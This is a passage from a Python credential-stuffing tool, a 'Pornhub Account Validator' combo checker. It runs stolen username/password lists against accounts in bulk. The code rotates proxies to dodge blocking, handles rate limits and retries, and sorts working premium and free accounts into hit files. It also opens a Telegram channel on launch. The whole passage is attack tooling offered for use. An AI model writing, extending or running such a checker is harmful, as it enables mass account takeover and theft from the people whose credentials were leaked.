    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "ph_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "ph_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "ph_errors.txt"), "w", encoding="utf-8")

    header = (f"# Pornhub Combo Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("ph_hits.txt", "hits"), ("ph_free.txt", "free"),
        ("ph_bad.txt", "bad"), ("ph_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (premium)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES, FETCH_SUBS
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Fetch Subscriptions: {CONFIG['fetch_subscriptions']}")
    print(f"  [11] Debug:              {CONFIG['debug']}")
    print(f"  [12] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(100, int(input("Threads (1-100): "))))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            CONFIG["fetch_subscriptions"] = not CONFIG["fetch_subscriptions"]
            _loader.settings["fetch_subscriptions"] = CONFIG["fetch_subscriptions"]
            FETCH_SUBS = CONFIG["fetch_subscriptions"]
            changed = True
        elif ch == "11":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]
            changed = True
        elif ch == "12":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Pornhub Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)